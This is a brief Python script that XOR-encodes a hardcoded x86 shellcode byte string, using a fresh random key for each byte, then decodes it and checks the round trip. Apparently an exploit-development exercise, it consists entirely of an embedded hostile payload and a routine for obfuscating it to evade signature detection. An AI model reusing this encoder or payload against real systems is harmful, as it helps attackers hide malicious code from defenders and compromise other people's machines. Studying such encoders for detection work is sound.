#!/usr/bin/env python3

import sys
import random

def encode(shellcode):
    """
    shellcode: string

    returns: string
    """
    shellcode_output = ""
    shellcode_list = []
    for i in shellcode.split("\\")[1:]:
        xor_key = random.randint(0,254)
        hex_key = hex(xor_key)
        byte = int(i.replace("x", "0x"), 16)
        shellcode_list.append(hex_key)
        shellcode_list.append(hex(xor_key ^ byte))

    return ",".join(shellcode_list)

def decode(encoded_shellcode):
    """decode()
    encoded_shellcode: string

    returns: string
    """
    shellcode_list = encoded_shellcode.split(",")
    it = iter(shellcode_list)
    decoded_shellcode = []
    for x in it:
        decoded_shellcode.append(hex(int(x, 16) ^ int(next(it), 16)))
    return ",".join(decoded_shellcode)

def main():
    orginal_shellcode = r"\xfc\xbb\x1b\x91\xcd\xc8\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x2a\x43\x9f\xa0\x22\x4c\x53\x59\xd2\xbd\xbc\xfb\x4b\x4b\x21\xca\x42\x7a\x66\x9d\x5f\xb0\xe6\xde\x5f\x4a\xe7\xde"
    new_shellcode = encode(orginal_shellcode)
    print("[+] Your encoded shellcode: ")
    print(new_shellcode)
    print("\n[+] Decoded shellcode:")
    decoded_shellcode = decode(new_shellcode)
    print(decoded_shellcode)
    assert decoded_shellcode.replace("0x","\\x").replace(",","") == orginal_shellcode.replace("\\x0", "\\x")


if __name__ == "__main__":
    main()

